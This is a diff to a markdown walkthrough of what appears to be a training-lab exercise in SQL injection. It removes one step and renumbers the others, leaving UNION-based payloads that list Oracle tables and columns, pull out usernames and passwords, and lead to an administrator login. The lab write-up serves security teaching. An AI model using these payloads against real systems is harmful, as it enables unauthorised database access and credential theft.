@@ -11,23 +11,19 @@
    - Test: `/filter?category=Gifts' ORDER BY 3--`
    - Result: Error (confirms 2 columns)
 
-### 3. Verify column data types:
-   - Test: `/filter?category=Gifts' UNION SELECT '1', '2' FROM dual--`
-   - Result: Values '1' and '2' displayed (confirms string compatibility)
-
-### 4. List the database contents:
+### 3. List the database contents:
    - Test: `/filter?category=Gifts' UNION SELECT NULL,table_name FROM all_tables --`
    - Result: List of tables in the database. There are many tables, we don't know which one has the username and password.
 
-### 5. List the table like USERS% :
+### 4. List the table like USERS% :
    - Test: `/filter?category=Gifts' UNION SELECT table_name,column_name FROM all_tab_columns WHERE table_name LIKE 'USERS_%' --`
    - Result: You'll see a table starts with users_... and its columns. Example: USERS_HZPHRO and its columns are PASSWORD_MZORWL and USERNAME_GZKLJS.
 
-### 6. Extract the username and password:
+### 5. Extract the username and password:
    - Test: `/filter?category=Gifts' UNION SELECT [YOUR_COLUMN_NAME],[YOUR_COLUMN_NAME] FROM [YOUR_TABLE_NAME]--`
    - Result: administrator and password
 
-### 7. Login to the administrator account
+### 6. Login to the administrator account
 
 ## Automated Solution
 
